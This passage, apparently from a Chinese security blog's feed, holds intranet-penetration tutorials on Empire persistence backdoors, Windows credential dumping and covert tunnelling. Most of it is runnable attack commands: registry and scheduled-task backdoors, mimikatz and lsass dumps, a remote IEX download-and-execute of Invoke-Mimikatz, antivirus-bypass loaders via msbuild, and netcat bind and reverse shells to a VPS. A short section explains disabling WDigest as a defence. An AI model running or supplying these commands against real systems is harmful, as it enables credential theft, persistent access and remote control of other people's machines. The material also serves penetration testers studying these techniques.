class="hljs-built_in">set</span> RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run<br>execute<br></code></pre></td></tr></table></figure><p>当我们登录系统时木马就会运行，服务端反弹成功。</p></li><li><h4 id="计划任务获得系统权限"><a href="#计划任务获得系统权限" class="headerlink" title="计划任务获得系统权限"></a>计划任务获得系统权限</h4><p>到了具体的时间将成功返回一个高权限shell,再实际渗透模块中运行该模块时，杀毒软件会有提示</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule persistence/elevated/schtasks<br><span class="hljs-built_in">set</span> Listener wei<br><span class="hljs-built_in">set</span> DailyTime 15:36<br>execute<br></code></pre></td></tr></table></figure><p>这里如果把 set RegPath改为    set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run</p><p>那么就会再15:36添加一个注册表注入后门。</p></li></ul><h2 id="Empire反弹回Metasploit"><a href="#Empire反弹回Metasploit" class="headerlink" title="Empire反弹回Metasploit"></a>Empire反弹回Metasploit</h2><p>在实际渗透中，当拿到Webshell上传的MSF客户端无法绕过目标主机的杀毒软件时，可以使用Powershell来绕过，也可以执行Empire的payload来绕过，成功之后在使用Empire的模块将其反弹回Metasploit</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule code_execution/invoke_shellcode<br><span class="hljs-built_in">set</span> Lhost                 <span class="hljs-comment">#设置msf所在主机的IP</span><br><span class="hljs-built_in">set</span> Lport                  <span class="hljs-comment">#设置端口</span><br>execute<br></code></pre></td></tr></table></figure><p>在msf上设置监听：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_https<br><span class="hljs-built_in">set</span> lhost                    <span class="hljs-comment">#一般不用管设置</span><br><span class="hljs-built_in">set</span> lport    <span class="hljs-comment">#一般不用管设置</span><br><span class="hljs-built_in">set</span> Shellcode                <span class="hljs-comment">#自定义shellcode注入</span><br>run<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>Empire使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网密码抓取</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h2 id="Hash读取"><a href="#Hash读取" class="headerlink" title="Hash读取"></a>Hash读取</h2><p>在提权成功拿到system权限之后，下一步就应该为内网渗透做准备。其中很重要的一步就是读取设备本地的hash值。工具读取hash的本质都是利用system权限去读取Windows的SAM文件。在Windows2012版本以下，还可以通过工具直接去读取内存里面的明文密码，Windows 2012之后不能再读内存中的明文，只能用mimiakatz等工具读取hash值然后进行破解。</p><p> <strong>一.使用pwdump获取hash</strong><br> pwdump是一款本地hash读取工具，需要系统权限运行，直接在CMD命令窗口运行即可。测试win7、Win03、window08 均可读取hash值：<br> <img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161004582.png" alt="image-20240107161004582"><br>下载地址:<a href="https://www.openwall.com/passwords/windows-pwdump">https://www.openwall.com/passwords/windows-pwdump</a><br><strong>二.使用Getpassowrd</strong><br>打开命令行环境，直接运行工具即可。可获取明文密码。<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161013909.png" alt="image-20240107161013909"><br>下载地址：<a href="https://github.com/QAX-A-Team/getpass">https://github.com/QAX-A-Team/getpass</a><br><strong>三.使用mimikatz</strong><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161023483.png" alt="image-20240107161023483"><br>Win10或Win 2012 R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，那么可通过修改注册表方式抓取明文，但需要重启电脑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 修改注册表路径,添加一个REG_DWORD类型名为UseLogonCredential设置为1,即可抓取明文</span><br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest<br><br><span class="hljs-comment"># 命令修改注册表方式如下</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure><p>下载地址：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><p> <strong>4.使用Powershell</strong></p><p>或者可以使用Empire的powershell mimikatz<br>powersploit内置有此模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">powershell -<span class="hljs-built_in">exec</span> bypass<br>Import-Module .\Get-PassHashes.PS1<br>Get-PassHashes<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161033151.png" alt="image-20240107161033151"></p><p>或者powershell版mimikataz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ps1脚本下载</span><br>https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1<br><span class="hljs-comment"># 访问上面链接,会跳转下面链接,所以DownloadString时,使用下面链接,不然会提示“基本连接已关闭等”错误</span><br>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1<br><br><span class="hljs-comment"># powershell抓取,前提保证目标可以访问ps1脚本,否则将脚本放在内网中 (执行速度非常慢)</span><br>powershell.exe IEX (New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;</span>);Invoke-Mimikatz<br></code></pre></td></tr></table></figure><p>这里我本地搞得就不用远程下载得方式了<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161041750.png" alt="image-20240107161041750"></p><p><strong>5.使用quarkspwdump</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">输入<br>QuarksPwDump.exe --dump-hash-local<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161051035.png" alt="image-20240107161051035"><br>下载地址:<a href="http://code.google.com/p/quarkspwdump/">http://code.google.com/p/quarkspwdump/</a> </p><p><strong>6.使用procdump+mimikatz</strong><br>procdump是微软官网发布得工具，可以在命令行下将目标lsass文件导出，且杀毒软件不会拦截这些操作，导出文件后将文件下载到本地，然后用mimikatz导出密码散列值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//使用procdump导出lsass.dmp文件<br>procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161100241.png" alt="image-20240107161100241"><br>导出成功，此时当前目录就会增加一个lsass.dmp文件，接下来就用Mimikatz导出密码散列值。<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161108564.png" alt="image-20240107161108564"><br><strong>7.通过 SAM和System 文件抓取密码</strong><br>无工具导出SAM文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg save hklm\sam sam.hive<br>reg save hklm\system system.hive<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161117265.png" alt="image-20240107161117265"><br>会在当前路径下增加两个文件 sam.hive  和 system.hive<br>使用mimikatz通过sam和system文件获取NTLM Hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//将两个文件和Mimikatz放在同一目录下<br>lsadump::sam /sam:sam.hive  /system:system.hive<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161126469.png" alt="image-20240107161126469"></p><p><strong>- wce</strong><br>命令：wce.exe -w（抓取明文）、wce.exe –l（抓取hash）</p><ul><li><strong>限制下载文件长度时导出凭据的方法</strong><br>在c#文件中加载mimikatz的方法，实现以下功能：<br>1.获得lsass.exe进程的dmp文件并保存到temp目录<br>2.从dmp文件导出凭据<br>3.删除dmp文件<br>很多实际情况环境对下载文件做了大小限制</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\Windows\Microsoft.NET\Framework64\v3<span class="hljs-number">.5</span>\csc.exe mimikatz.cs /unsafe<br></code></pre></td></tr></table></figure><p>然后直接执行exe<br>mimikatz bypass<br>1.PE to shellcode<br>下载地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pe2shc.exe mimikatz.exe mimi.txt<br>runshc64.exe mimi.txt<br></code></pre></td></tr></table></figure><p>这个方法不太行了<br>2.c#加载mimikatz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cscript mimikatz.js<br></code></pre></td></tr></table></figure><p>3.白名单加载mimikatz<br>使用白名单程序msbuild进行进行加载xml文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\msbuild.exe mimikatz.xml<br></code></pre></td></tr></table></figure><p>4..net4.0加载mimikatz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\MSBuild.exe executes-mimikatz.xmlC:\Windows\Microsoft.NET\Framework64\v4<span class="hljs-number">.0</span><span class="hljs-number">.30319</span>\MSBuild.exe executes-mimikatz.xml<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161135261.png" alt="image-20240107161135261"></p><p><strong>- msf</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">run hashdump<br>hashdump<br>post/windows/gather/credentials/domain_hashdump(获取域<span class="hljs-built_in">hash</span>)<br>use mimikatz<br>wdigest（明文）<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161144776.png" alt="image-20240107161144776"></p><p>实战中抓密码大部分都是直接用msf或c2上的工具抓的吧</p><h2 id="单机抓密码防范方法"><a href="#单机抓密码防范方法" class="headerlink" title="单机抓密码防范方法"></a>单机抓密码防范方法</h2><p>  微软为了防止用户密码在内存种以明文形式泄露，发布了补丁KB2871997,关闭了Wdigest功能。<br>windows server 2012 及以上版本默认关闭Wdigest，使攻击者无法从内存种获取明文密码。Windows server 2012及以下的版本，如果安装了KB2871997,攻击者同样无法获取明文密码。<br>        在日常网络维护中，通过查看注册表项Wdigest，可以判断Wdigest功能的状态。如果该项的值为1，用户下次登录时，攻击者就能使用工具获取明文密码。应该确保该项的值为0，使用户明文密码不会出现在内存中。</p><p>在命令行环境中开启或关闭Wdigest Auth,有如下两种方法<br>1.reg add</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在注册表中添加一个键值，将其设置为0，电脑注销后,windows将不会把密码明文存储在内存中</span><br>reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f <br><br><span class="hljs-comment">#在注册表中添加一个键值，将其设置为1，windows会把密码明文存储在内存中</span><br>reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br><br><span class="hljs-comment">#键值是否添加成功</span><br>reg query HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential <span class="hljs-comment">#查询</span><br></code></pre></td></tr></table></figure><p>2.powershell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#开启wdigest Auth</span><br>Set-ItemProperty -Path  HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential -Type DWORD -Value 1<br><br><span class="hljs-comment">#关闭wdigest Auth</span><br>Set-ItemProperty -Path  HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential -Type DWORD -Value 0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>密码抓取</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网隧道隐藏</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="隐藏通信隧道"><a href="#隐藏通信隧道" class="headerlink" title="隐藏通信隧道"></a><strong>隐藏通信隧道</strong></h2><p><strong>1.1 隐藏通信隧道基础知识</strong></p><p>在实际的网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。<br>常用的隧道列举如下：</p><ul><li>网络层：IPv6隧道、IMCP隧道、GRE隧道</li><li>传输层：TCP隧道、UDP隧道、常规端口转发</li><li>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</li></ul><p><strong>1.2 判断内网的连通性</strong><br>判断内网的连通性是指判断机器能否上外网等。要综合判断各种协议（TCP、HTTP、DNS、ICMP等)及端口通信的情况。常见的允许流量流出的端口有80、8080、443、53、110、123等。<br>常用的内网连通性判断方法如下</p><ul><li>ICMP协议</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping &lt;ip或 域名&gt;<br></code></pre></td></tr></table></figure><ul><li>TCP协议<br>netcat(简称nc)被誉为网络安全界的“瑞士军刀”，是一个短小精悍的工具，通过使用TCP或UDP协议的网络连接读写数据。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc  &lt;ip 端口&gt;<br>例如：<br>nc 192.168.1.1 80<br></code></pre></td></tr></table></figure><ul><li>HTTP协议</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl &lt;ip:端口&gt;<br></code></pre></td></tr></table></figure><p>如果远程主机开启了相应的端口，会输出相应的端口信息，如果远程主机没有开启相应的端口，则没有任何提示。</p><ul><li>DNS协议<br>在进行DNS连通性检测时，常用的命令为nslookup和dig</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nslookup 域名<br></code></pre></td></tr></table></figure><p>有一种情况是流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。常见的判断方法如下。<br>1.查看网络连接，判断是否存在与其他机器8080(不绝对)等端口的连接(可以尝试运行 “ping -n 1 -a ip”)<br>2.查看内网中是否有主机名类似于”proxy”的机器<br>3.查看IE浏览器的直接代理<br>4.根据pac文件的路径(可能是本地路径，也可能是远程路径），将其下载下来并查看。<br>5.执行如下命令，利用curl工具确认</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl www.baidu.com   //不通<br>curl -x proxy-ip:port wwww.baidu.com    //通<br></code></pre></td></tr></table></figure><p><strong>2.1 网络层隧道技术</strong></p><ul><li>ICMP隧道<br>常用工具有：icmpsh、PingTunnel、icmptunnel、powershell icmp等<br>1.icmpsh<br>因为icmpsh工具要代替系统本身的Ping命令的应答程序，所有需要输入如下命令来关闭本地系统的icmp应答（如果需要恢复，设置为0），否则shell的运行不稳定</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysctl -w net.ipv4.icmp_echo_ignore_all=1<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161726848.png" alt="image-20240107161726848"></p><p>配置环境服务端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install epel-release<br>yum -y install python-pip<br>pip install --upgrade pip -i https://pypi.tuna.tsinghua.edu.cn/simple<br>pip install Impacket -i https://pypi.tuna.tsinghua.edu.cn/simple<br></code></pre></td></tr></table></figure><p>VPS运行：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161736186.png" alt="image-20240107161736186"><br>直接运行run.sh会报错。所以这里运行py的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python icmpsh_m.py &lt;vpsIP&gt; &lt;受控端IP&gt;<br></code></pre></td></tr></table></figure><p>目标主机运行：<br>将icmpsh.exe扔进目标主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\icmpsh.exe -t vps主机IP  <br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161743249.png" alt="image-20240107161743249"><br>结果：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161749884.png" alt="image-20240107161749884"><br>项目地址：<a href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a></p><ul><li>Pingtunnel<br>Pingtunnel也是一款常用的隧道工具。可跨平台使用。为避免隧道被滥用，可以为隧道设置密码</li></ul><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161758361.png" alt="image-20240107161758361"></p><p>搭建：下载后解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> PingTunnel<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161806558.png" alt="image-20240107161806558"><br>跳板机运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ptunnel -x shuteer<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161813322.png" alt="image-20240107161813322"><br>攻击机运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./ptunnel -p 192.168.112.37 -lp 1080 -da 10.10.10.30 -dp 3389 -x shuteer<br></code></pre></td></tr></table></figure><pre><code class="hljs">-lp：指定本地监听的端口-p 指定ICMP隧道另一端的IP-da：指定要转发的目标机器的IP-dp：指定要转发的目标机器的端口-x：指定连接密码</code></pre><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161822221.png" alt="image-20240107161822221"></p><p>攻击机连接目标3389端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rdesktop -f  192.168.112.254:1080<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161830177.png" alt="image-20240107161830177"><br>成功连接到目标机</p><p>Pingtunnel工具在windows环境中也可以运行，只不过要在内网的Windows机器上安全wincap类库。</p><p><strong>2.2 传输层隧道技术</strong></p><ul><li>LCX<br>1.内网端口转发<br>lcx工具是一个基于Socket套接字实现的端口转发工具。有windows和Linux两个版本。windows为lcx.exe,liunx版本为portmap。</li></ul><p>在目标机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#将目标机上的3389端口的所有数据转发到公网vps的4444端口上</span><br>lcx.exe  -slave &lt;vps主机地址&gt; 4444  127.0.0.1  3389<br><br>portmap -m 3 -h1 127.0.0.1 -p1 33389 -h2 &lt;vps主机地址&gt; -p2 4444<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161844806.png" alt="image-20240107161844806"></p><p>在vps上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#将本机 4444端口上监听的所有数据转发到本机的5555端口上</span><br>lcx.exe  -listen 4444 5555<br><br>portmap -m 2 -p1 4444 -h2 &lt;vps主机地址&gt; -p2 5555<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161853593.png" alt="image-20240107161853593"><br>结果：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161904872.png" alt="image-20240107161904872"><br>成功访问到目标3389</p><p>2.本地端口映射<br>如果目标服务器由于防火墙的限制，部分端口(例如3389)的数据无法通过防火墙，可以将目标服务器相应的端口的数据穿透传到防火墙允许的其他端口(例如53）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lcx.exe -tran 53 &lt;目标主机IP地址&gt; 3389<br></code></pre></td></tr></table></figure><ul><li>netcat<br>常用参数:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">-l ： 使用监听模式，管理和控制传入的数据<br>-p : 设置本地主机使用的通信端口<br>-v ： 详细输出<br>-d ：后台模式<br>-e : 程序重定向<br></code></pre></td></tr></table></figure></li></ul><p>1.获取shell<br>（1）正向shell<br>在目标主机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 4444 -e /bin/sh     //linux<br>nc -lvp 4444 -e c:\windows\system32\cmd.exe      //windows<br></code></pre></td></tr></table></figure><p>在vps上执行：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161919507.png" alt="image-20240107161919507"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc &lt;目标主机IP&gt;  4444<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107161927286.png" alt="image-20240107161927286"><br>（2).反向shell<br>在目标机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc &lt;vps主机IP&gt; 9999 -e /bin/sh      //linux<br>nc &lt;vps主机IP&gt; 9999 -e 